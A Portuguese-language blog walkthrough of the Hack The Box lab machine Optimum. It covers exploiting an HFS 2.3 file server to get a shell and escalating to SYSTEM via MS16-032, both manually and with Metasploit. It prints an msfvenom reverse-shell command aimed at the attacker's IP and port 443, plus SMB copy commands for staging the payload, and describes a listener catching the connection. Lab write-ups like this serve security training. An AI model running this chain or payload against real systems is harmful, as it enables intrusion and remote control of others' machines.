---
title: "Hack The Box - Optimum"
tags: [Windows,Easy,Local Exploit Suggester,Msfvenom,Impacket SMB,MS16-032,HFS]
categories: HackTheBox OSCP
---

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-optimum/Opt_1.png)

Link: <https://www.hackthebox.eu/home/machines/profile/6>

# Enumeração

## Primeiro passo é rodar o nmap contra a máquina, para verificar quais portas estão abertas e quais serviços estão sendo disponibilizados pelas portas.

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-optimum/Opt_nmap.png)


### Explicação de cada parâmetro do Nmap
> -sC --> Rodar alguns scripts padrão em cada porta

> -sV --> Levantar qual serviço está rodando na porta

> -Pn --> Já considera o host ativo

### Verificamos que temos uma porta aberta

Porta 80
> Possivelmente rodando um servidor Web Httpd File System Versão 2.3

## Enumeração servidor Web Porta 80

Ao abrirmos a página no navegador:

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-optimum/Opt_web.png)

Verificamos que é uma página onde parece ser um File Server.
Vamos procurar por exploits para essa aplicação.

# Exploração

## Utilizamos o Searchsploit para procurar por exploits

Encontramos um exploit para a versão especificada no Nmap, como demonstrado na imagem:

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-optimum/Opt_searchsploit.png)

### Fazemos uma cópia dele para nossa pasta de trabalho

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-optimum/Opt_search-m.png)

> Lendo com ele funciona, devemos ter um servidor web hospedando um nc.exe na nossa máquina, ao executar o exploit, o servidor HFS vai vir na minha máquina, baixar o nc.exe e me devolver um prompt de comando, então vamos a execução!

### Fazemos as alterações de IP e Porta dentro do Exploit para funcionar

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-optimum/Opt_ip-porta.png)

### Copiamos e levantamos um servidor web com um `nc.exe` sem disponibilizado

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-optimum/Opt_nc-web.png)

### Abrimos um listener na porta 443, executamos o exploit e ganhamos um shell

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-optimum/Opt_shell.png)

### Pegamos a flag de user

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-optimum/Opt_flaguser.png)

# Escalação de Privilégio

Agora vamos realizar a escalação de privilégio de modo a obter a flag de root

## Método 01 -> Através do Windows Exploit Suggester

### Salvamos a saida do comando **systeminfo** em um arquivo

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-optimum/Opt_sysinfo.png)

Encontramos o scprit nesse link

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-optimum/Opt_wespy.png)

### Rodamos o `windows exploit suggester` no arquivo com a saida do systeminfo

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-optimum/Opt_wespy1.png)

A saida desse scprit é grande, mas escolhemos explorar a MS16-032, como descrito na imagem abaixo:

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-optimum/Opt_wespy2.png)

### Pesquisamos como faremos pra explorar essa vulnerabilidade

Procuramos no google mesmo, pelo seu código

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-optimum/Opt_expdb.png)

Encontramos um link do Exploit-DB

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-optimum/Opt_db.png)

#### Após analizarmos o código, vimos que temos que realizar algumas pequenas mudanças para que o exploit funcione na máquina Optimum

O "problema" é que ele deveria executar um PowerShell, como esta especificado no nome do exploit, contudo no corpo do exploit temos cmd.exe. Como mostrado na imagem:

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-optimum/Opt_db1.png)

#### Realizamos as mudanças nele

Deverá ficar dessa maneira

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-optimum/Opt_exploit.png)

### Criação do exploit.exe

Com o auxílio do **msfvenom** criamos o exploit.exe

> msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.119 LPORT=443 -f exe > exploit.exe

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-optimum/Opt_exploit1.png)

Explicação msfvenom

> -p windows/shell_reverse_tcp --> Qual é o payload que vou utilizar.

> LHOST --> Qual o IP que a máquina explorada deve tentar se conectar quando executar o exploit

> LPORT --> Qual porta que a máquina explorada deve tentar se conectar quando executar o exploit

> -f exe --> formato que vai ser salvo o exploit

## Para enviar o arquivo para a máquina Optmium utilizaremos de um Servidor Samba do impacket

### A utilização é simples e será descrita nas imagems abaixo:

Primeiro passo é levantar o servidor samba na máquina Kali

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-optimum/Opt_smb.png)

Após isso realizar a cópia do arquivos *exploit.exe* para o Desktop da máquina Optimum, pasta a qual foi colocada no dentro do exploit retirado do Exploit-DB

> copy \\10.10.16.119\arquivos\exploit.exe C:\\Users\\kostas\\Desktop

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-optimum/Opt_down.png)

Agora copiamos o exploit para dentro da máquina, utilizando a mesma ideia

> copy \\10.10.16.119\arquivos\exploit.ps1 C:\\Users\\kostas\\Desktop

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-optimum/Opt_down2.png)

Executamos o exploit (com o listener aberto na porta 443) e recebemos a conexão reversa de Authority

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-optimum/Opt_root.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-optimum/Opt_root2.png)

Pegamos a flag de root

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-optimum/Opt_root3.png)


## Método 02 -> Através do Metasploit Framework

Pesquisamos pelo exploit no msfconsole

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-optimum/Opt_meter0.png)

Setamos as opções no exploit

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-optimum/Opt_meter1.png)

Rodamos e ganhamos o shell

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-optimum/Opt_meter2.png)

### Escalando Privilégio pelo Metasploit Framework

Pesquisamos pelo módulo do Local Exploit Suggester

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-optimum/Opt_meter3.png)

Setamos as opções nele

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-optimum/Opt_meter4.png)

Rodamos o módulo

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-optimum/Opt_meter5.png)

Procuramos pelo MS16-032 no Metasploit Framework

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-optimum/Opt_meter6.png)

Setamos as opções nele

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-optimum/Opt_meter7.png)

Executamos e ganhamos o shell de Authority

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-optimum/Opt_meter8.png)


